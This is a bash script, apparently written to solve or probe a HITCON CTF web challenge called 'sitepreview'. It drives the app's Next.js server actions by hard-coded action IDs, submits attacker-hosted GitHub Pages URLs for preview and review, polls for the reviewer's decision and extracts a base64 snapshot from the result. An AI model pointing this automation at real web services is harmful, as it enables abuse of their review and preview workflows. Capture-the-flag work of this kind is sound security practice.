#!/bin/bash
set -o pipefail
BASE_EXT="https://sitepreview.chal.hitconctf.com"
CREATE_ID="40826ee1e38d462252e0a1f6761f0741fca9607bbe"
REVIEW_ID="400cce7790f1e3554d5a9d0db54d9870b9ca678be9"

# 1. force fresh instance
curl -s -b cookies.txt -X POST "$BASE_EXT/stop" -o /dev/null
sleep 3
curl -s -c cookies.txt -b cookies.txt -X POST "$BASE_EXT/create" -d "token=$TEAM_TOKEN" -o /dev/null
sleep 6
PORT=$(curl -s -b cookies.txt --max-time 30 "$BASE_EXT/" | grep -oE 'http://sitepreview\.chal\.hitconctf\.com:[0-9]+' | head -1)
echo "INSTANCE=$PORT T0=$(date +%s)"
for i in $(seq 1 30); do code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$PORT/" || true); [ "$code" = "200" ] && break; sleep 1; done
echo "READY T+$(($(date +%s)-T0))s"

mkprev() {
  ENC=$(python3 -c "import json,sys;print(json.dumps([sys.argv[1]]))" "$1")
  R=$(curl -s --max-time 60 -X POST "$PORT/" -H "Next-Action: $CREATE_ID" -H "Content-Type: text/plain;charset=UTF-8" -d "$ENC")
  echo "$R" | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | head -1
}
reqrev() {
  P=$(curl -s --max-time 30 "$PORT/preview/$1")
  B=$(echo "$P" | python3 -c "
import sys,re
h=sys.stdin.read()
m=re.search(r'1c:.\\\\\"([A-Za-z0-9+/=]{50,})\\\\\"', h) or re.search(r'1c:\"([A-Za-z0-9+/=]{50,})\"', h) or re.search(r'1c:.\"([A-Za-z0-9+/=]{50,})', h)
print(m.group(1) if m else 'NOBLOB')")
  [ "$B" = "NOBLOB" ] && { echo "NOBLOB"; return; }
  RR=$(curl -s --max-time 90 -X POST "$PORT/preview/$1" -H "Next-Action: $REVIEW_ID" -H "Content-Type: text/plain;charset=UTF-8" -d "[$B]")
  if echo "$RR" | grep -q '"E{'; then echo "ERR"; else echo "OK"; fi
}
dec() { curl -s --max-time 15 "$PORT/render/$1" | grep -oE '(Approved|Rejected)' | head -1 || true; }

PA=$(mkprev "https://marlobbz.github.io/sitepreview-test/")
echo "PID_A=$PA T+$(($(date +%s)-T0))s"
RA=$(reqrev "$PA")
echo "REVIEW_A=$RA T+$(($(date +%s)-T0))s"

PB=$(mkprev "https://marlobbz.github.io/sitepreview-test/static-embed/")
echo "PID_B=$PB T+$(($(date +%s)-T0))s"
RB=$(reqrev "$PB")
echo "REVIEW_B=$RB T+$(($(date +%s)-T0))s"

T1=$(date +%s)
while true; do
  NOW=$(date +%s); EL=$((NOW-T1))
  A=$(dec "$PA"); B=$(dec "$PB")
  [ -n "$A" ] && [ ! -f .da ] && { echo "A_DECISION=$A T+$(($(date +%s)-T0))s"; touch .da; }
  [ -n "$B" ] && [ ! -f .db ] && { echo "B_DECISION=$B T+$(($(date +%s)-T0))s"; touch .db; }
  [ -f .da ] && [ -f .db ] && break
  [ $EL -gt 150 ] && { echo "TIMEOUT A=$A B=$B"; break; }
  sleep 3
done
rm -f .da .db

# snapshot extraction if B approved
if [ "$B" = "Approved" ]; then
  curl -s --max-time 30 "$PORT/render/$PB" -o render_page.html
  python3 - <<'PYEOF'
import re, base64
h = open("render_page.html").read()
m = re.search(r'dataUrl":"(data:image/[^"]+)', h) or re.search(r'dataUrl\\":\\"(data:image/[^\\]+)', h)
if m:
    du = m.group(1)
    open("snapshot_dataurl.txt","w").write(du)
    open("snapshot.png","wb").write(base64.b64decode(du.split(",",1)[1]))
    print("SNAPSHOT_SAVED")
else:
    print("NO_DATAURL")
PYEOF
fi
echo "DONE PA=$PA PB=$PB"
